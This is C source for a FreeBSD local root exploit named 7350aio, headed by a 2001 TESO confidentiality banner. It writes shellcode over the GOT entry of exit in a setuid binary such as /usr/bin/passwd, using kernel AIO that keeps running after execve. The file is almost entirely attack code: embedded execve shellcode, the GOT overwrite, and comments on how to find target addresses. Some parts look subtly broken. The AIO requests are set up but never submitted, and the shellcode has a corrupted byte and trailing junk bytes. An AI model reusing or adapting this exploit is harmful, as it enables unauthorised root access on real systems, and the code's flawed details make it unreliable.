/* 7350aio - FreeBSD Local AIO Exploit
 *
 * TESO CONFIDENTIAL - SOURCE MATERIALS
 *
 * This is unpublished proprietary source code of TESO Security.
 *
 * The contents of these coded instructions, statements and computer
 * programs may not be disclosed to third parties, copied or duplicated in
 * any form, in whole or in part, without the prior written permission of
 * TESO Security. This includes especially the Bugtraq mailing list, the
 * www.hack.co.za website and any public exploit archive.
 *
 * (C) COPYRIGHT TESO Security, 2001
 * All Rights Reserved
 *
 ***************************************************************************
 * bug found by z 13/07/01
 *
 * "options VFS_AIO" must be in your kernel config, which is not enabled
 * by default. Hopefully some day it will be :)
 *
 * get the GOT address of exit by doing:
 * $ objdump --dynamic-reloc bin | grep exit
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <aio.h>

char code[]=
	"\x31\xc0\x50\x50\xb0\x17\xcd\x80"
	"\x6a\x3b\x58\x99\x52\x89\xe3\x68\x6e\x2f\x73\x68"
	"\x68\x2f\x2f\x62\x69\x60\x5e\x5e\xcd\x80"
	"\x5c\x37\x87\xc9\xdf\x10\xbb\x23\xdb\x1a\xdd\x2f\x94\xef\x4d\xbb";

unsigned long GOT = 0x0804fe20;
char *execbin = "/usr/bin/passwd";

int
main (argc, argv)
	int			argc;
	char			**argv;
{
	int			fds[2], sdf[2];
	struct aiocb		cb, cb2;
	char			buf[128], d;

	if ((d = getopt (argc, argv, "g:e:")) != -1) {
		switch (d) {
		case 'g':
			GOT = strtoul (optarg, NULL, 16);
			break;
		case 'e':
			execbin = optarg;
			break;
		}
	}

	printf ("got address: %08lx\n", GOT);
	printf ("executable: %s\n", execbin);
	/*
	 * pipes are treated differently to sockets, with sockets the
	 * aiod gets notifyed, whereas with pipes the aiod starts
	 * immediately blocking in fo_read. This is a problem because
	 * after the execve the aiod is still using the old vmspace struct
	 * if you use pipes, which means the data doesnt actually get copied
	 */
	if (socketpair (AF_UNIX, SOCK_STREAM, 0, fds) < 0) {
		perror ("socketpair");
		return (EXIT_FAILURE);
	}

	if (socketpair (AF_UNIX, SOCK_STREAM, 0, sdf) < 0) {
		perror ("socketpair");
		return (EXIT_FAILURE);
	}

	if (fork() != 0) {
		close (fds[0]);
		close (sdf[0]);
		memset (&cb, 0, sizeof(cb));
		memset (&cb2, 0, sizeof(cb2));
		cb.aio_fildes = fds[1];
		cb.aio_offset = 0;
		cb.aio_buf = (void *)GOT;
		cb.aio_nbytes = 4;
		cb.aio_sigevent.sigev_notify = SIGEV_NONE;

		cb2.aio_fildes = sdf[1];
		cb2.aio_offset = 0;
		cb2.aio_buf = (void *)0xbfbfff80;
		cb2.aio_nbytes = sizeof(code);
		cb2.aio_sigevent.sigev_notify = SIGEV_NONE;
		execl (execbin, "test", NULL);
	} else {
		close(fds[1]);
		close(sdf[1]);
		sleep(2);
		printf ("writing\n");
		write (sdf[0], code, sizeof(code));
		*(unsigned int *)buf = 0xbfbfff80;
		write (fds[0], buf, 4);
	}
	return (EXIT_SUCCESS);
}

